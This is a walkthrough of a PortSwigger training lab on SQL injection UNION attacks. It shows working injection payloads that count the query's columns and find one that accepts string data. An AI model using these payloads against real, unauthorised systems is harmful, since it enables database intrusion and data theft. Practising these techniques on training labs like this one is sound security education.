# SQL injection UNION attack, finding a column containing text

**Lab Url**: [https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

## Objective

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

## Solution

First, determine the number of columns returned by the query, then probe each column to find one compatible with string data. Finally, inject the provided value into that column.

### Step 1: Determine the column count

```bash
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```

The query returns **three columns**.

### Step 2: Find a string-compatible column

Replace each `NULL` with a string value (`'a'`) one at a time until the response succeeds:

```bash
/filter?category=Gifts' UNION SELECT 'a',NULL,NULL--
/filter?category=Gifts' UNION SELECT NULL,'a',NULL--
/filter?category=Gifts' UNION SELECT NULL,NULL,'a'--
```

A successful response identifies the string-compatible column.

### Step 3: Display the provided value

Replace the identified column with the random value provided in the lab description. For example, if the second column is string-compatible and the value is `9ka3IS`:

```bash
/filter?category=Gifts' UNION SELECT NULL,'9ka3IS',NULL--
```

The response displays the value, solving the lab.
